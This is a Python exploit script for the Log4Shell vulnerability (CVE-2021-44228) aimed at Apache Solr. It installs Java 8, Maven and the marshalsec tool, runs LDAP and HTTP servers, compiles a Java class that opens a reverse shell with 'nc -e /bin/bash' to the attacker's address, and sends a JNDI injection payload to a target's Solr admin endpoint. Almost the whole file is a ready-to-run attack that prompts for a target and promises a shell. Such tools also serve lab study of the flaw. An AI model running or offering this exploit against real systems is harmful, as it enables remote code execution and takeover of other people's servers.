# Made by @CaraTortu (06/05/2022)
# CVE-2021-44228

import os, threading, requests, time
from os.path import exists

def detectPkgMngr():
    # Detect package manager and return it
    options = ["apt", "yum", "dnf", "zypper", "pacman"]
    bins = os.listdir("/bin")
    for option in options:
        if option in bins:
            return option

def detectJavaVersion():
    # Detect Java version
    java_version = os.popen("java -version 2>&1").read()
    if "openjdk version" in java_version:
        return java_version

def detectGit():
    git = os.popen("which git 2>&1").read()
    if "which: no" not in git:
        print("\033[92m[+]\033[00m Git is installed, checking maven...")
        detectMaven()
    else:
        print("[-] Git is not installed, installing...")
        installGit()

def detectMaven():
    # Detect Maven
    mvn = os.popen("which mvn 2>&1").read()
    if "which: no" not in mvn or "not found" not in mvn:
        print("\033[92m[+]\033[00m Maven is installed, installing marshall...")
        installMarshall()
    else:
        print("[-] Maven is not installed, installing...")
        installMaven()

def installGit():
    print("[i] If you're not root you will be asked for a password for installation")
    options = {
        "apt": "sudo apt-get install git",
        "yum": "sudo yum install git",
        "dnf": "sudo dnf install git",
        "zypper": "sudo zypper install git",
        "pacman": "sudo pacman -S git"
    }
    os.system(options[detectPkgMngr()])
    print("\033[92m[+]\033[00m Git installed, checking maven...")
    detectMaven()

def installMarshall():
    if not exists("marshalsec.jar"):
        os.system("git clone https://github.com/mbechler/marshalsec.git")
        os.chdir("marshalsec")
        os.system("mvn clean package -DskipTests")
        os.system("cp target/marshalsec*.jar ../")
        os.chdir("..")
        os.system("rm -rf marshalsec *SNAPSHOT.jar")
        os.system("mv * marshalsec.jar")
        print("\033[92m[+]\033[00m Marshall installed, running...")
    else:
        print("\033[92m[+]\033[00m Marshall is already installed, running...")
    exploit()

def installMaven():
    print("[i] If you're not root you will be asked for a password for installation")
    options = {
        "apt": "sudo apt-get install maven",
        "yum": "sudo yum install maven",
        "dnf": "sudo dnf install maven",
        "zypper": "sudo zypper install maven",
        "pacman": "sudo pacman -S maven"
    }
    os.system(options[detectPkgMngr()])
    print("\033[92m[+]\033[00m Maven installed, installing marshall...")
    installMarshall()

def installJava8():
    print("[i] If you're not root you will be asked for a password for installation")
    options = {
        "apt": "sudo apt-get install openjdk-8-jdk",
        "yum": "sudo yum install java-1.8.0-openjdk",
        "dnf": "sudo dnf install java-1.8.0-openjdk",
        "zypper": "sudo zypper install java-1.8.0-openjdk",
        "pacman": "sudo pacman -S jdk8-openjdk"
    }
    os.system(options[detectPkgMngr()])
    print("\033[92m[+]\033[00m Java 8 installed, checking git...")
    detectGit()

def setupJava():
    java_version = detectJavaVersion()
    if "1.8.0" in java_version:
        print("\033[92m[+]\033[00m Java 8 is installed, checking git...")
        detectGit()

    else:
        print("[-] Java is not installed, installing...")
        installJava8()

def LDAPExploit(ip):
    print("\033[92m[+]\033[00m LDAP listener started...")
    os.system(f"java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer \"http://{ip}:8000/#Exploit\"")

def httpServer():
    print("\033[92m[+]\033[00m HTTP server started...")
    os.system("python3 -m http.server 8000")

def generateExploit(ip, port):
    expl = """
public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec(\"nc -e /bin/bash %s %s\");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

    """ % (ip, port)

    with open("Exploit.java", "w") as f:
        f.write(expl)
    
    os.system("javac Exploit.java")
    print("\033[92m[+]\033[00m Exploit generated, waiting for threads to finish and execute a shell...")

def triggerExploit(ip, target, action):
    if action == "n":
        url = "http://%s:8983/solr/admin/cores?foo=${jndi:ldap://%s:1389/Exploit}" % (target, ip)
        requests.get(url)
        print("\033[92m[+]\033[00m Exploit triggered, you should have gotten a reverse shell!")
    else:
        print("\n\033[92m[+]\033[00m Paste this payload and enjoy your shell!: \033[94m${jndi:ldap://%s:1389/Exploit}\033[00m" % ip)

def setup():
    os.system("mkdir src")
    os.chdir("src")
    setupJava()

def exploit():
    ip = input("Enter the IP address you want to listen on: ")
    port = input("Enter the port for the reverse shell: ")
    action = input("Do you want to just print the payload? [y/n]: ")
    target = ""
    if action == "n":
        target = input("Enter the target IP address: ")

    threading.Thread(target=LDAPExploit, args=(ip,)).start()
    time.sleep(1)
    threading.Thread(target=generateExploit, args=(ip, port)).start()
    threading.Thread(target=httpServer).start()
    time.sleep(10 if action == "n" else 1)
    threading.Thread(target=triggerExploit, args=(ip, target, action)).start()

if __name__ == "__main__":
    setup()
